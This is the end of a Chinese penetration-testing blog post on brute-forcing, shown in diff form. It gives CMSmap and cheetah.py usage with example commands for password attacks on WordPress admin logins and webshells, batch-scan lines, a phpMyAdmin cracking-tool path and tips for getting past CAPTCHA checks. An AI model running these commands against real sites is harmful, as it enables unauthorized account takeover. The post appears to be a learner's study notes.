+<p><strong>phpMyAdmin暴力破解多线程密码枚举工具</strong>：D:\xinan\穷举工具\穷举工具\穷举工具\phpMyAdmin批量破解工具\phpMyAdmin批量破解工具\phpMyAdmin多线程批量破解工具.exe</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641629.png" alt="image-20240202091811087"></p>
+<p><strong>常见cms穷举</strong></p>
+<p>wordpress穷举:<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/dionach/CMSmap">https://github.com/dionach/CMSmap</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">cmsmap.py 是一个用于扫描和检测内容管理系统（CMS）漏洞的工具。以下是其用法和解释：</span><br><span class="line">扫描选项：</span><br><span class="line">target：目标URL，例如 &#x27;https://example.com:8080/&#x27;。</span><br><span class="line">-f W/J/D/M, --force W/J/D/M：强制扫描特定CMS类型，可选的值为 W（WordPress）、J（Joomla）、D（Drupal）或 M（Moodle）。</span><br><span class="line">-F, --fullscan：进行完整扫描，使用大型插件列表。可能会有误报和速度较慢。</span><br><span class="line">-t , --threads：指定线程数，默认为 5。</span><br><span class="line">-a , --agent：设置自定义用户代理。</span><br><span class="line">-H , --header：添加自定义头信息，例如 &#x27;Authorization: Basic ABCD...&#x27;。</span><br><span class="line">-i , --input：从给定文件中列出的多个目标进行扫描。</span><br><span class="line">-o , --output：将输出保存到文件中。</span><br><span class="line">-E, --noedb：在不搜索漏洞的情况下枚举插件。</span><br><span class="line">-c, --nocleanurls：仅适用于Drupal，禁用清晰的URL。</span><br><span class="line">-s, --nosslcheck：不验证服务器的证书。</span><br><span class="line">-d, --dictattack：在扫描期间运行低强度的字典攻击（每个用户5次尝试）。</span><br><span class="line">暴力破解选项：</span><br><span class="line">-u , --usr：指定用户名或包含用户名的文件。</span><br><span class="line">-p , --psw：指定密码或包含密码的文件。</span><br><span class="line">-x, --noxmlrpc：在不使用XML-RPC的情况下暴力破解WordPress。</span><br><span class="line">后渗透选项：</span><br><span class="line">-k , --crack：破解密码哈希文件（需要安装hashcat，仅适用于WordPress和Joomla）。</span><br><span class="line">-w , --wordlist：指定字典文件。</span><br><span class="line">其他选项：</span><br><span class="line">-v, --verbose：详细模式，默认为假。</span><br><span class="line">-h, --help：显示帮助信息并退出。</span><br><span class="line">-D, --default：使用默认选项运行CMSmap。</span><br><span class="line">-U , --update：更新CMSmap、插件或两者，可选的值为 C（CMSmap）、P（Plugins）或 PC（both）。</span><br><span class="line"></span><br><span class="line">#常用例子</span><br><span class="line">  ./cmsmap.py http://www.wordpress.com		//启动</span><br><span class="line">  cmsmap.py https://example.com</span><br><span class="line">  cmsmap.py https://example.com -f W -F --noedb -d</span><br><span class="line">  cmsmap.py https://example.com -i targets.txt -o output.txt</span><br><span class="line">  cmsmap.py https://example.com -u admin -p passwords.txt	//破解后台一般使用这个命令</span><br><span class="line">  cmsmap.py -k hashes.txt -w passwords.txt</span><br><span class="line">  </span><br><span class="line">  批量扫描的方法</span><br><span class="line">./cmsmap.py -i /root/wp.txt -u admin -p /root/password.txt -v -o w.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>一句话密码穷举</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">cheetah.py 是一个用于快速暴力破解 Webshell 密码的工具。以下是其用法和解释：</span><br><span class="line">基本用法：</span><br><span class="line">-h, --help：显示帮助信息并退出。</span><br><span class="line">-i, --info：显示 cheetah 的信息并退出。</span><br><span class="line">-v, --verbose：启用详细输出（默认禁用）。</span><br><span class="line">-c, --clear：清除重复的密码（默认禁用）。</span><br><span class="line">-up, --update：更新 cheetah。</span><br><span class="line">-r , --request：指定请求方法，默认为 POST。</span><br><span class="line">-t , --time：指定请求间隔秒数，默认为 0。</span><br><span class="line">-w , --webshell：指定 Webshell 类型，默认自动检测。</span><br><span class="line">-s , --server：指定 Web 服务器名称，默认自动检测。</span><br><span class="line">-n , --number：指定请求参数的数量。</span><br><span class="line">-u , --url：指定 Webshell 的 URL。</span><br><span class="line">-b , --url-file：指定批量 Webshell 的 URL 文件。</span><br><span class="line">-p FILE [FILE ...]：指定密码文件，默认为 pwd.list。</span><br><span class="line"></span><br><span class="line">示例用法：</span><br><span class="line">python cheetah.py -u http://orz/orz.php</span><br><span class="line">python cheetah.py -u http://orz/orz.jsp -r post -n 1000 -v</span><br><span class="line">python cheetah.py -u http://orz/orz.asp -r get -c -p data/pwd.list</span><br><span class="line">python cheetah.py -u http://orz/orz -w aspx -s iis -n 1000</span><br><span class="line">python cheetah.py -b url.list -c -p pwd1.list pwd2.list -v</span><br></pre></td></tr></table></figure>
+
+<p><strong>webshell****密码破解</strong></p>
+<p>burpsuite2.0 通过破解办法</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.yijuhua.com/b.asp"><strong>http://www.yijuhua.com/b.asp</strong></a></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.yijuhua.com/b.php"><strong>http://www.yijuhua.com/b.php</strong></a></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.yijuhua.com/b.aspx"><strong>http://www.yijuhua.com/b.aspx</strong></a></p>
+<p><strong>有验证码后台的破解方法</strong></p>
+<ol>
+<li><p>验证码cookie是否重复利用 </p>
+</li>
+<li><p>验证码是否可以重复利用 </p>
+</li>
+<li><p>验证码是否可以识别</p>
+</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">hya</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/post/4eaf266d.html">http://example.com/post/4eaf266d.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%88%86%E7%A0%B4/">爆破</a></div><div class="post_share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/247e3357.html" title="SQL注入篇MySQL+PHP延时注入"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SQL注入篇MySQL+PHP延时注入</div></div></a></div><div class="next-post pull-right"><a href="/post/43cea1e2.html" title="渗透测试中的常用编码"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">渗透测试中的常用编码</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC81OTU0Ny8zNjAwOQ=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="cols"><div class="col"><div class="container"><div class="front avatarPanel"><div class="inner"><div class="player-title">个人属性</div><div class="player-avatar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/hya4.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div></div></div><div class="back attributesPanel"><div class="inner"><div class="player-lv">LV.1</div><div class="player-name">hya</div><div class="attributes-value"><div class="attributes-value-item"><a href="/archives/"><div class="attributes">文章</div><div class="value-bar"><div class="value-bar-fill" style="width:9.00%"><div class="value-bar-fill-in" style="background: rgba(89, 230, 54,0.6)"></div></div></div><span>9/100</span></a></div><div class="attributes-value-item"><a href="/tags/"><div class="attributes">标签</div><div class="value-bar"><div class="value-bar-fill" style="width:4.00%"><div class="value-bar-fill-in" style="background: rgba(224, 20, 20, 0.6)"></div></div></div><span>4/100</span></a></div><div class="attributes-value-item"><a href="/categories/"><div class="attributes">分类</div><div class="value-bar"><div class="value-bar-fill" style="width:1.00%"><div class="value-bar-fill-in" style="background: rgba(30, 97, 226, 0.6)"></div></div></div><span>1/100</span></a></div></div></div></div></div></div><div class="col"><div class="container"><div class="front descriptionPanel"><div class="inner"><div class="player_description">扬帆求知海，笔耕理纷绪。<br>
+学海心宏远，墨香意绵绵。<br>
+书扉纳乾坤，智慧花绽放。<br>
+心航无止境，境界更卓越。
+</div><div class="play-bottom"></div></div></div><div class="back buttonPanel"><div class="inner"><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://www.bilibili.com/"><i class="fab fa-github"></i><span>进入新世界！</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/user-hya" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:l_1836725545@163.com" rel="external nofollow noreferrer" target="_blank" title="邮箱"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div><div class="play-bottom"></div></div></div></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A9%B7%E4%B8%BE%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">穷举篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E7%A9%B7%E4%B8%BE"><span class="toc-number">1.1.</span> <span class="toc-text">文件和目录穷举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text">常见的端口服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E7%A9%B7%E4%B8%BE"><span class="toc-number">1.3.</span> <span class="toc-text">常见端口服务穷举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kali-metasploit-%E7%A9%B7%E4%B8%BE%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">kali metasploit 穷举模块使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%82%AE%E7%AE%B1%E7%A9%B7%E4%B8%BE"><span class="toc-number">1.5.</span> <span class="toc-text">邮箱穷举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E7%AF%87"><span class="toc-number">1.6.</span> <span class="toc-text">网站篇</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/fe1c6489.html" title="SQL注入篇MySQL+PHP读写操作"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入篇MySQL+PHP读写操作"/></a><div class="content"><a class="title" href="/post/fe1c6489.html" title="SQL注入篇MySQL+PHP读写操作">SQL注入篇MySQL+PHP读写操作</a><time datetime="2024-03-07T09:00:00.000Z" title="发表于 2024-03-07 17:00:00">2024-03-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/2826c232.html" title="SQL注入篇MySQL+PHP手工注入"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入篇MySQL+PHP手工注入"/></a><div class="content"><a class="title" href="/post/2826c232.html" title="SQL注入篇MySQL+PHP手工注入">SQL注入篇MySQL+PHP手工注入</a><time datetime="2024-03-07T08:18:00.000Z" title="发表于 2024-03-07 16:18:00">2024-03-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/b3088729.html" title="SQL注入篇MySQL+PHP手工注入爆破篇"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入篇MySQL+PHP手工注入爆破篇"/></a><div class="content"><a class="title" href="/post/b3088729.html" title="SQL注入篇MySQL+PHP手工注入爆破篇">SQL注入篇MySQL+PHP手工注入爆破篇</a><time datetime="2024-03-07T07:18:00.000Z" title="发表于 2024-03-07 15:18:00">2024-03-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/6f93ef5.html" title="信息收集篇文件和目录的扫描"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息收集篇文件和目录的扫描"/></a><div class="content"><a class="title" href="/post/6f93ef5.html" title="信息收集篇文件和目录的扫描">信息收集篇文件和目录的扫描</a><time datetime="2024-03-07T06:18:00.000Z" title="发表于 2024-03-07 14:18:00">2024-03-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/3b46b5f7.html" title="文件上传漏洞篇"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件上传漏洞篇"/></a><div class="content"><a class="title" href="/post/3b46b5f7.html" title="文件上传漏洞篇">文件上传漏洞篇</a><time datetime="2024-03-07T05:18:00.000Z" title="发表于 2024-03-07 13:18:00">2024-03-07</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/1.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2024 By hya</div><div class="footer_custom_text">这是一个菜鸟的个人博客！</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>(()=>{
+  const loadLivere = () => {
+    if (typeof LivereTower === 'object') window.LivereTower.init()
+    else {
+      (function(d, s) {
+          var j, e = d.getElementsByTagName(s)[0];
+          if (typeof LivereTower === 'function') { return; }
+          j = d.createElement(s);
+          j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+          j.async = true;
+          e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    }
+  }
+
+  if ('Livere' === 'Livere' || !false) {
+    if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
+    else loadLivere()
+  } else {
+    window.loadOtherComment = loadLivere
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="112875926" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><script async src="//at.alicdn.com/t/c/font_4442793_t0qkxnu55c.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = '72d2e91fb28d47e8b015370429583a83';
+  var gaud_map_key = 'b1b414f8dea8d21824cc2364055dd5e1';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '112.982279,28.19409';
+  var clock_default_rectangle_enable = 'false';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
+    var item_html = '<div id="workboard"></div>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.js"></script><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;post/fe1c6489.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a6.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-03-07</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;post/fe1c6489.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">SQL注入篇MySQL+PHP读写操作</a><div class="blog-slider__text">渗透测试SQL注入篇MySQL+PHP读写操作</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;post/fe1c6489.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;post/2826c232.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a5.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-03-07</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;post/2826c232.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">SQL注入篇MySQL+PHP手工注入</a><div class="blog-slider__text">渗透测试SQL注入篇MySQL+PHP手工注入</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;post/2826c232.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;post/b3088729.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/3.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-03-07</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;post/b3088729.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">SQL注入篇MySQL+PHP手工注入爆破篇</a><div class="blog-slider__text">渗透测试SQL注入篇MySQL+PHP手工注入爆破</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;post/b3088729.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;post/6f93ef5.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a2.jpg" alt="" 